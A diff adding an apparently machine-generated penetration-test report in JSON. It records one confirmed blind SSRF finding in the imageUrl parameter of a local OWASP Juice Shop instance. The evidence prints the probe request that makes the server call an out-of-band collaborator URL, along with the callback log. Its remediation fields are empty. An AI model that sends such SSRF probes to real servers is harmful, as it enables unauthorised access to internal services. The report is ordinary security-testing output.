@@ -1,0 +1,67 @@
+{
+  "id": "361d49f2-3443-4a13-9ab6-a535208c4696",
+  "engagement_name": "A2b Juice Shop SSRF discovery",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-22T10:49:50.990974Z",
+  "test_end": "2026-07-22T10:49:50.990974Z",
+  "generated_at": "2026-07-22T10:49:50.991703Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 1 findings identified.",
+    "risk_rating": "High",
+    "critical_count": 0,
+    "high_count": 1,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "9c32998b-bf5d-4ac5-861c-bcd46be77e1d",
+      "title": "Server-Side Request Forgery (SSRF) \u2014 blind_oob_confirmed",
+      "description": "Technique: WSTG-INPV-19 (SSRF). Parameter: imageUrl.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:3000/profile/image/url",
+      "evidence": [
+        "Request: SSRF blind_oob_confirmed http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18081/bryu2wjujlcecg22ihulf4nrr4",
+        "Response: out-of-band callback bearing the probe nonce received (http from 127.0.0.1)",
+        "phases_completed=6 verified=True strength=verified-oob",
+        "exploitation_type=blind_oob_confirmed",
+        "capability=fetch_confirmed=True,content_reflected=False,schemes=[]",
+        "candidate_param=imageUrl",
+        "internal_target=http://host.docker.internal:18081/bryu2wjujlcecg22ihulf4nrr4",
+        "indicator_type=oob_callback",
+        "indicator_observed=out-of-band callback bearing the probe nonce received (http from 127.0.0.1)",
+        "confirmation=P6 target=http://host.docker.internal:18081/bryu2wjujlcecg22ihulf4nrr4 status=None",
+        "outbound_probe: POST http://localhost:3000/profile/image/url \u2014 imageUrl=http://host.docker.internal:18081/bryu2wjujlcecg22ihulf4nrr4",
+        "callback_nonce='bryu2wjujlcecg22ihulf4nrr4' (carried only in the one outbound probe; control_bore_it=False)",
+        "confirming_excerpt: inbound callback: proto=http src=127.0.0.1 host=host.docker.internal:18081 path=/bryu2wjujlcecg22ihulf4nrr4 received_at=1784717365.831",
+        "control [fresh single-use nonce minted but never sent to the target \u2014 the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] status=None"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-22T10:49:50.987181Z",
+      "validated_at": null,
+      "discovery_provenance": {
+        "technology_key": "node-js",
+        "observed_version": "",
+        "sink_shape_id": "js.http_egress",
+        "primitive_class": "egress_fetch",
+        "primitive_id": "egress_fetch.java_openconnection",
+        "confirmation_primitive": "P3/P1",
+        "reachability_grade": "static_confirmed",
+        "gating_config": "ProxyBaseUrl"
+      }
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
